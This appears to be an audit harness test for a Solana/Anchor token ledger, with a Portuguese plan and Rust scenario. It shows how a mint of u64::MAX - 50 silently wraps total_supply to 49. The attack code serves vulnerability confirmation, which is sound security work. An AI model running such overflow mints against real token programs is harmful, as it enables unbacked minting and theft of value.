{
  "plan": "Inicializamos o ledger com total_supply = 100 e user_balance = 0 via a instrucao initialize (baseline). Em seguida, chamamos mint com amount = u64::MAX - 50, que somado ao total_supply atual (100) ultrapassa u64::MAX e faz wrapping_add dar a volta. O efeito medido e que total_supply e user_balance resultam em valores pequenos (49 e u64::MAX - 50, respectivamente) em vez de a instrucao falhar, confirmando o overflow silencioso.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger vazia para init
let ledger_empty = empty_account();
let authority_wallet = wallet(10_000_000_000);
let (system_id, system_acc) = system_program_account();

// Baseline: initialize com initial_supply = 100
let ix_init = env.anchor_ix(
    "initialize",
    &(100u64,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_id, false),
    ],
);
let contas_init = vec![
    (ledger_key, ledger_empty),
    (authority, authority_wallet),
    (system_id, system_acc),
];
let r_init = env.baseline("initialize ledger com 100", &ix_init, &contas_init);

// Extrai a conta ledger resultante do baseline
let ledger_after_init = r_init
    .resulting_accounts
    .iter()
    .find(|(k, _)| *k == ledger_key)
    .map(|(_, a)| a.clone())
    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data("Ledger", &(authority, 100u64, 0u64)), None));

// Ataque: mint com amount = u64::MAX - 50 (100 + (u64::MAX - 50) > u64::MAX)
let amount_ataque = u64::MAX - 50;
let ix_mint = env.anchor_ix(
    "mint",
    &(amount_ataque,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_mint = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000)),
];
let r_ataque = env.attack("mint com amount que causa overflow", &ix_mint, &contas_mint);

if r_ataque.program_result == ProgramResult::Success {
    let ledger_final = after(&r_ataque, &ledger_key);
    let total_supply_final = read_u64(ledger_final.data(), 40);
    let user_balance_final = read_u64(ledger_final.data(), 48);
    // Esperado se wrapping: total_supply = 100 + (u64::MAX - 50) mod 2^64 = 49
    // user_balance = 0 + (u64::MAX - 50) = u64::MAX - 50
    env.effect(
        "total_supply deu a volta (49) e user_balance = u64::MAX - 50, confirmando overflow silencioso",
        total_supply_final == 49u64 && user_balance_final == amount_ataque,
    );
}"
}

